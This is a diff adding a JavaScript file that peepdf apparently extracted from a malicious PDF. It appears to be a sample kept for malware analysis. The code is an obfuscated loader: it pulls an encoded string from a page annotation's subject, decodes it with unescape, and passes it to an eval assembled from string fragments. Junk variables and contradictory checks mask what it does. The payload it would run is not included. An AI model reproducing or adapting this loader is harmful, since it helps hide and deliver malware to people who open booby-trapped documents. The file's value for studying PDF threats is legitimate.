@@ -1,0 +1,46 @@
+// peepdf comment: Javascript code located in object 5 (version 0)
+
+var sum = '';
+var duct = 300;
+var os = "";
+var pr = null;
+var num = 1;
+var func = 'd';
+
+app.doc.syncAnnotScan();
+if (app.plugIns.length < 1) {
+    func += "4";
+    num = 0;
+}
+
+if (!(app.plugIns.length < 0)) {
+    var fcb;
+    var xnm = {
+        nPage: 0
+    };
+    fcb = this;
+    pr = app.doc.getAnnots(xnm);
+    sum = pr[num].subject;
+}
+
+if (app.plugIns.length > 2) {
+    var dacs = String;
+    var ser = dacs["fromC" + "ha" + "rCode"];
+    var buf = sum.split(/-/);
+    var bull = fcb["une" + "sca" + "pe"];
+
+    for (var n = 0; n < buf.length - 1; n++) os += bull(ser(37) + buf[n + 1]);
+
+    func = "";
+
+    if (app.plugIns.length > 0) {
+        if (!(app.plugIns.length > 0)) {
+            num = 123;
+            func += "abd";
+        }
+        num = 123;
+        fcb['ev' + func + ser(67 + 30) + "l"](os);
+        num = 456;
+    }
+}
+
